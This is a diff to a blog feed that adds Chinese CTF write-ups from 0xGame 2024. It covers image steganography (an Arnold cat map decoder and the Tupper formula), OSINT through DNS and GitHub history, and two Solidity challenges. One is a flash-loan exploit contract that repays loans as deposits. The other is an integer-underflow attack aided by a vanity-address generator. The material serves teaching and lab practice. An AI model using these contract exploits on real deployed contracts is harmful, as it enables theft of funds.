@@ -1960,6 +1960,62 @@ GTGGATGTTCGGGTTCGGGTGGTAGCCGCACTTCTCCTTGCGGGTGCAGAAGATCTTGCGCTCGAGGTCGGTTGA&amp;
 &lt;a href=&#34;https://postimg.cc/nsBqGzWp&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/R0bG9JQ6/QQ20241120-102222.png&#34; alt=&#34;QQ20241120-102222.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
  将加密位改为 09 以后保存，输⼊密码 0xGame2024 即可解压&lt;br /&gt;
 &lt;a href=&#34;https://postimg.cc/Kk5LCWFW&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/NM342hnQ/QQ20241120-102338.png&#34; alt=&#34;QQ20241120-102338.png&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;报告哈基米&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报告哈基米&#34;&gt;#&lt;/a&gt; 报告哈基⽶&lt;/h3&gt;
+&lt;p&gt;题⽬附件只给了⼀个  &lt;code&gt;mijiha.png&lt;/code&gt;  ，拖⼊&lt;strong&gt; 010 Editor&lt;/strong&gt; 看⼀下，⼀眼就能看⻅⽂件尾的逆置字符串，再关注⼀下 chunk 块就能发现倒数第⼆个&lt;strong&gt; IDAT&lt;/strong&gt; 块未满的情况下还跟了⼀个&lt;strong&gt; IDAT&lt;/strong&gt; 块，不过其实眼神好⼀些可以直接注意到上⽅的 &lt;strong&gt;txt.ahijim&lt;/strong&gt; ：&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/f3W8TgBT&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/JhZvxfXJ/QQ20241130-103337.png&#34; alt=&#34;QQ20241130-103337.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 先对⽂件尾的字符串逆置⼀下可以得到：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Maybe You Need To Know Arnold Cat?&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;查阅资料可以知道这是猫映射变换，可以进⾏逆变换，不过需要知道  &lt;code&gt;a,b&lt;/code&gt;  参数以及&lt;br /&gt;
+ &lt;code&gt;shuffle_times 置乱次数&lt;/code&gt; ，经过⼀些尝试可以发现这些参数通过 LSB 隐写进图⽚中了，可以⽤&lt;br /&gt;
+&lt;strong&gt; stegsolve&lt;/strong&gt;，也可以⽤ zsteg：&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/PPGK8q27&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/Dy0NHJs7/QQ20241130-103558.png&#34; alt=&#34;QQ20241130-103558.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 之后编写脚本或者直接在⽹上找到逆变换脚本即可解出 flag 前半部分（这里找脚本花了点时间，不然应该是 3 血...）：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from PIL import Image
+
+def arnold_decode(image,a,b):
+    decode_image = Image.new(image.mode, image.size)
+    h,w = image.size
+    data = image.load()
+    ddata = decode_image.load()
+    N = h
+    for y in range(h):
+        for x in range(w):
+            nx = ((a * b + 1) * x - b * y) % N
+            ny = (y - a * x) % N
+            ddata[ny, nx] = data[y, x]
+    return decode_image
+    
+img = Image.open(&amp;quot;mijiha.png&amp;quot;)
+origin_img = arnold_decode(img,35,7) //a和b的值
+origin_img.show()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&#34;https://postimg.cc/XZX9PMsF&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/nLGTCp7d/QQ20241130-104039.png&#34; alt=&#34;QQ20241130-104039.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 再分析多出来的 chunk 块，仔细观察可以发现是 zip 逆置了，提取出来：&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/Jy9HdsDV&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/LXsk5fmX/QQ20241130-104149.png&#34; alt=&#34;QQ20241130-104149.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 解压得到 &lt;strong&gt;mijiha.txt&lt;/strong&gt; ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?reppuT sihT sI
+2526565031717334081355849302824518400002066054780560033875031426082285618693525
+3197947986260660061254903632195060862841955904524591906806462061364308502305093
+2619286392265892437331136910010009953251537997460505708306515998831852308855434
+2510823923801250157027140252790785117812414283997607047894726844336402237327944
+2990707067394596729387386831719959265436919835123671909480195776896949753133113
+1678724441340620116821065803071781191275190780231200490991180560260984739111695
+0248882484065492329404895296665244558410377999740959307786584149849
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;同样将其整段逆置：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;9489414856877039590479997730148554425666925984049232945604842888420596111937489
+0620650811990940021320870915721911871703085601286110260431444278761311331357949
+6986775910849091763215389196345629599171386837839276954937607070992449723732204
+6334486274987407067993824142187115870972520417207510521083293280152434558803258
+1388995156038075050647997351523599000100196311337342985622936829162390503205803
+4631602646086091954254095591482680605912363094521600660626897497913525396816582
+2806241305783300650874506602000048154282039485531804337171305656252
+Is This Tupper?
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查找 Tupper 相关资料，发现有&lt;a href=&#34;https://tuppers-formula.ovh/&#34;&gt;在线⼯具&lt;/a&gt;可以直接解，拿到 flag 后半部分：&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/ppqhMGhB&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/DwKqsR7R/QQ20241130-104323.png&#34; alt=&#34;QQ20241130-104323.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 或者在 github 上也能找到相关项⽬&lt;a href=&#34;https://github.com/cariad/tupper%EF%BC%9A&#34;&gt; https://github.com/cariad/tupper：&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/s1zJJgkG&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/jqwktWvc/QQ20241130-104459.png&#34; alt=&#34;QQ20241130-104459.png&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;blockchain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blockchain&#34;&gt;#&lt;/a&gt; Blockchain&lt;/h2&gt;
 &lt;h3 id=&#34;肘上链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#肘上链&#34;&gt;#&lt;/a&gt; 肘，上链！&lt;/h3&gt;
 &lt;blockquote&gt;
@@ -2001,6 +2057,113 @@ print(hash_hex)
 &lt;li&gt;回到&lt;strong&gt; nc&lt;/strong&gt; 那边，&lt;strong&gt;get flag&lt;/strong&gt;&lt;br /&gt;
 &lt;a href=&#34;https://postimg.cc/ftwy3rwZ&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/bJntB7WG/QQ20241121-102900.png&#34; alt=&#34;QQ20241121-102900.png&#34; /&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;h3 id=&#34;theft&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#theft&#34;&gt;#&lt;/a&gt; theft&lt;/h3&gt;
+&lt;p&gt;通过在 execute 中执⾏ deposit，来替代还款，从⽽可以达到借了就还但是⾃⼰的余额越来越多&lt;/p&gt;
+&lt;p&gt;Exp:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+interface FlashLoan &amp;#123;
+    function deposit() external payable;
+    function withdraw() external;
+    function flashLoan(uint256 amount) external;
+&amp;#125;
+
+contract Exp &amp;#123;
+    FlashLoan public FL;
+    
+    constructor(address _addr) &amp;#123;
+        FL = FlashLoan(_addr);
+    &amp;#125;
+    
+    function attack() external &amp;#123;
+        for(int i = 0; i &amp;lt; 9; i++)&amp;#123;
+            FL.flashLoan(100 ether);
+        &amp;#125;
+        FL.flashLoan(99 ether);
+    &amp;#125;
+    
+    function execute() external payable &amp;#123;
+        FL.deposit&amp;#123;value: msg.value&amp;#125;();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先 at address 部署 Setup.sol 获取 target 地址，然后填⼊构造函数部署再调⽤ attack 即可&lt;/p&gt;
+&lt;h2 id=&#34;osint&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osint&#34;&gt;#&lt;/a&gt; OSINT&lt;/h2&gt;
+&lt;h3 id=&#34;互联网的一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#互联网的一&#34;&gt;#&lt;/a&gt; 互联⽹的⼀⻆&lt;/h3&gt;
+&lt;p&gt;访问题⽬⻚⾯，摁 F12 就可以看到前端有注释&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/VdVM2fVR&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/RZMR6q1j/QQ20241130-104939.png&#34; alt=&#34;QQ20241130-104939.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 这⾥的注释指的是要求查询 CNAME 记录，后⾯上的 hint 中也给出了。查询 CNAME 记录的⽅法其实有很多，ping、nslookup、dig 等等都可以，最简单的就是这⾥直接 ping ⼀下。&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/JDMBjGs1&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/KzgrSTFg/QQ20241130-105043.png&#34; alt=&#34;QQ20241130-105043.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;http://xn--6kqx04a.github.io&#34;&gt; 对于.github.io&lt;/a&gt;，如果有经验的话⼀眼就知道这是 github pages。如果不知道，查找⼀下也很快能得知，这是 github 上⼀个叫做 oxg4me2024 的⽤⼾搭建的⻚⾯，去 github 上搜索⼀下这个⽤⼾。&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/2L5bXMdM&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/prffytmW/QQ20241130-105156.png&#34; alt=&#34;QQ20241130-105156.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ ⼀路顺藤摸⽠找进去，可以找到 flag.txt&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/F1PJJFN4&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/gkpyQr7n/QQ20241130-105240.png&#34; alt=&#34;QQ20241130-105240.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 但是 flag.txt 的内容并不是 flag，这⾥点击右上⻆的 History，查询这个⽂件的修改历史即可看到 flag&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/v1d1dcLW&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/3wk2mGkb/QQ20241130-105311.png&#34; alt=&#34;QQ20241130-105311.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/ZCGnrCQ1&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/dV1CcCjt/QQ20241130-105404.png&#34; alt=&#34;QQ20241130-105404.png&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;我哪来那么多臭钱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#我哪来那么多臭钱&#34;&gt;#&lt;/a&gt; 我哪来那么多臭钱？？&lt;/h3&gt;
+&lt;p&gt;具体的部署等操作这⾥就不再赘述了，参考前几题。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.7.0;
+
+contract Challenge &amp;#123;
+    mapping(address =&amp;gt; uint256) public balance;
+    bool public solve;
+    constructor() &amp;#123;&amp;#125;
+    
+    function Get() public &amp;#123;
+        balance[msg.sender] = 50;
+    &amp;#125;
+    
+    function Transfer(address to, uint256 amount) public &amp;#123;
+        require(amount &amp;gt; 0, &amp;quot;Man!&amp;quot;);
+        require(balance[msg.sender] &amp;gt; 0, &amp;quot;What can I say&amp;quot;);
+        require(balance[msg.sender] - amount &amp;gt; 0, &amp;quot;Mamba out!&amp;quot;);
+        require(uint160(msg.sender) % (16*16) == 239, &amp;quot;Sometimes I ask myself,who am i?&amp;quot;);
+        balance[msg.sender] -= amount;
+        balance[to] += amount;
+    &amp;#125;
+    
+    function check() public &amp;#123;
+        require(balance[msg.sender] == 114514);
+        solve=true;
+    &amp;#125;
+    
+    function isSolved() public view returns (bool) &amp;#123;
+        return solve;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先来看合约代码。Get 函数为初始化 balance 为 50，check 函数为检查余额是否为 114514，当余额为 114514 时，isSolved 函数返回 true。&lt;/p&gt;
+&lt;p&gt;主要是 Transfer 函数，⽤于向某个地址转账，但这⾥做了⼀系列的限制。要求转账⾦额、转账前余额、转账后余额都⼤于 0，另外要求当前发起转账的⽤⼾地址后两位为 ef。&lt;/p&gt;
+&lt;p&gt;这⾥有两个考点，⼀个是整数溢出，我们可以注意到 solidity 版本为 0.7.0，balance 和 amount 的类型都为 uint256，即数据⼤⼩在 0~2&lt;strong&gt;256 之间。代码中有 balance [msg.sender] - amount &amp;gt; 0 的要求，但是如果 amount &amp;gt; balance [msg.sender]，那么会发⽣什么？显然值并不会变为负数，这⾥值会直接变成 2&lt;/strong&gt;256 - amount + balance [msg.sender]。因此，我们只要使 amount 的值为 2**256-114514+50 即可。这⾥其实有些师傅是想复杂了。&lt;/p&gt;
+&lt;p&gt;另外⼀个考点其实是虚荣地址（vanity address），也就是后来给的 hint 中所指的。虚荣地址就是⽤⼾&lt;br /&gt;
+⾃⼰⽣成的具有某⼀特殊组合的地址，google ⼀下其实不难找到有⼀个&lt;a href=&#34;https://vanity-eth.tk/&#34;&gt;在线⽹站&lt;/a&gt;可以⽣成虚荣地址，如下图所⽰。&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/yJSw08wr&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/R0P453G9/QQ20241130-110254.png&#34; alt=&#34;QQ20241130-110254.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 但其实⾃⼰或者让 GPT 帮忙搓⼀个脚本其实也不难.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from eth_account import Account
+import secrets
+def find_address_ending_with_ef():
+    while True:
+        private_key = &#39;0x&#39; + secrets.token_hex(32)
+        account = Account.from_key(private_key)
+        address = account.address
+        if address.endswith(&#39;ef&#39;):
+            return private_key, address
+private_key, address = find_address_ending_with_ef()
+print(f&amp;quot;Private Key: &amp;#123;private_key&amp;#125;&amp;quot;)
+print(f&amp;quot;Address: &amp;#123;address&amp;#125;&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来导⼊私钥就可以⽤了。&lt;/p&gt;
+&lt;p&gt;先 get&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/0K9FgdrL&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/BbF0Km3Q/QQ20241130-110506.png&#34; alt=&#34;QQ20241130-110506.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 然后 transact，to 的地址随便填就⾏&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/kDCkt9wf&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/Vs01pktQ/QQ20241130-110554.png&#34; alt=&#34;QQ20241130-110554.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 再 check，可以看到 isSolved 返回了 true&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/NLxZ6VzY&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/3JM7TQjy/QQ20241130-110624.png&#34; alt=&#34;QQ20241130-110624.png&#34; /&gt;&lt;/a&gt;&lt;br /&gt;
+ 拿到 flag&lt;br /&gt;
+&lt;a href=&#34;https://postimg.cc/4mNqB5Dc&#34;&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i.postimg.cc/RVcmCpGg/QQ20241130-110654.png&#34; alt=&#34;QQ20241130-110654.png&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
